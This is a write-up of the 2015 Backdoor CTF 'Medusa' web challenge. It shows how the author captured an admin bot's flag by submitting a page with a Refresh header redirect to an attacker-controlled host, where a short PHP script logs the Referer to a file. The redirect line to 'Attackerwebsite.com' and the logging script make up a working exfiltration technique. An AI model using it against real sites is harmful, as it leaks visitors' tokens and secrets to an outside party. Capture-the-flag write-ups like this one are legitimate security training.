---
layout: post
title: "Backdoor CTF 2015 - Medusa Writeup"
date: 2015-04-03 01:06:09 +0430
comments: true
categories: ctf backdoor web
---

**Backdoor2015 Medusa Writeup**  
**Point = 100**  
**Category = Web**  
**Description : **  

> The html page you create will be visited by the backdoor admin with the flag.
>You can enter a fake flag to simulate the challenge.


>Get the flag at http://hack.bckdr.in/MEDUSA/

After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.

<!-- more -->

![alt text](http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png "Medusa Form")

Backdoor CTF admin add a hint and mention that they sent flag as post request

this is sample request that admin sent :

http://hack.bckdr.in/MEDUSA/view.php?id=ID&flag=FLAG

when you sent the message Medusa website create id for you.
you can visit your message with this id ( same as admin :D )

![alt text](http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png "Message Read")

we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.

>after some investigation our team found answer !!!

we can redirect admin to another page and get the flag

but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.

write some code to get and save the Referer in the text file when admin redirect to our PHP page :
Server.php

```
<?php
$ref = $_SERVER['HTTP_REFERER'];
file_put_contents("flag.txt",$ref);
?>
```

 > and sent this code as our page to Medusa form :
```
---
location: http://Attackerwebsite.com/server.php
---
Can you get the **flag**?
```
but after admin visit the link flag.txt is empty !!!

no Referer sent to PHP page...

we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt

after some research we found out with this kind of header redirection we cant get Referer and we should change that.

```
---
Refresh: 0; url=http://Attackerwebsite.com/server.php
---
Can you get the **flag**?

```

and guess what?
> we have Referer Link in flag.txt :D



[Referer Link With Flag!](http://hack.bckdr.in/MEDUSA/view.php?flag=[redacted]&id=d61d051c6e741595491c)

and now you have 100 point :D

WriteUp By Fr0nk

